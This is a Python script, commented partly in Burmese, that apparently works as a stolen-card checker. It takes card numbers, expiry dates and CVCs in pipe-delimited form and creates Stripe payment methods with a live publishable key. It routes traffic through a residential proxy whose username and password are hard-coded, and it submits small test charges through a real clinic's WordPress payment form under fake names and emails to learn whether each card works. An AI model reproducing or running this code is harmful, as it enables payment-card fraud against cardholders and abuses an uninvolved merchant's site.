import requests, re
import random
import string
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# ==========================================
# 👇 PROXY SETTINGS (US Virginia Beach 🇺🇸 + Auto Retry)
# ==========================================
PROXY_HOST = 'geo.g-w.info'
PROXY_PORT = '10080'

# 🔥 မင်းရဲ့ Proxy User/Pass (ဒီအတိုင်းထားလိုက်တယ်)
PROXY_USER = 'user-RWTL64GEW8jkTBty-type-residential-session-4t8p24ud-country-US-city-Austin-rotation-15'
PROXY_PASS = 'EJJT0uWaSUv4yUXJ'

# Proxy String တည်ဆောက်ခြင်း
proxy_url = f"http://{PROXY_USER}:{PROXY_PASS}@{PROXY_HOST}:{PROXY_PORT}"
proxies = {
    'http': proxy_url,
    'https': proxy_url
}

def Tele(ccx):
    try:
        ccx = ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3]

        if "20" in yy:
            yy = yy.split("20")[1]

        letters = string.ascii_lowercase + string.digits
        random_name = ''.join(random.choice(letters) for i in range(10))
        random_email = f"{random_name}@gmail.com"

        # 🔥 RETRY SYSTEM (Connection ငြိမ်အောင်) 🔥
        session = requests.Session()
        retry = Retry(connect=3, backoff_factor=0.5)
        adapter = HTTPAdapter(max_retries=retry)
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        session.proxies = proxies

        # ==========================================
        # Step 1: Create Payment Method (PM)
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }

        data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element&key=pk_live_51HS2e7IM93QTW3d6EuHHNKQ2lAFoP1sepEHzJ7l1NWvDr7q2vEbmp3v5GM6gwdtgmO3HnEQ3JGeWtZJNXiNEd97M0067w1jUqv'

        # session.post ကိုသုံးပြီး Timeout 40s ထားသည်
        response = session.post(
            'https://api.stripe.com/v1/payment_methods', 
            headers=headers, 
            data=data,
            timeout=40
        )
        
        # Error Checking for PM creation
        if 'id' not in response.json():
            return "Error Creating Payment Method ❌"
            
        pm = response.json()['id']

        # Step 2: Charge Request
        headers = {
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': 'https://farmingdalephysicaltherapywest.com',
            'Referer': 'https://farmingdalephysicaltherapywest.com/make-payment/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
        }

        data = {
            'action': 'wp_full_stripe_inline_payment_charge',
            'wpfs-form-name': 'Payment-Form',
            'wpfs-form-get-parameters': '%7B%7D',
            'wpfs-custom-amount-unique': '0.5', 
            'wpfs-custom-input[]': 'Super',
            'wpfs-card-holder-email': random_email, 
            'wpfs-card-holder-name': 'Mr Virus',
            'wpfs-stripe-payment-method-id': f'{pm}',
        }

        # session.post ကိုသုံးပြီး Timeout 40s ထားသည်
        response = session.post(
            'https://farmingdalephysicaltherapywest.com/wp-admin/admin-ajax.php',
            headers=headers,
            data=data,
            timeout=40
        )
        
        # Result ကို ယူမယ်
        try:
            result = response.json().get('message', 'No message in response')
        except:
            if "Cloudflare" in response.text or response.status_code == 403:
                result = "IP Blocked by Site ❌"
            else:
                result = "Request Failed ⚠️"

    except Exception as e:
        # Retry Limit ကျော်သွားရင် Error ပြမယ်
        result = f"Connection Failed (Retry Limit) ⚠️"

    return result
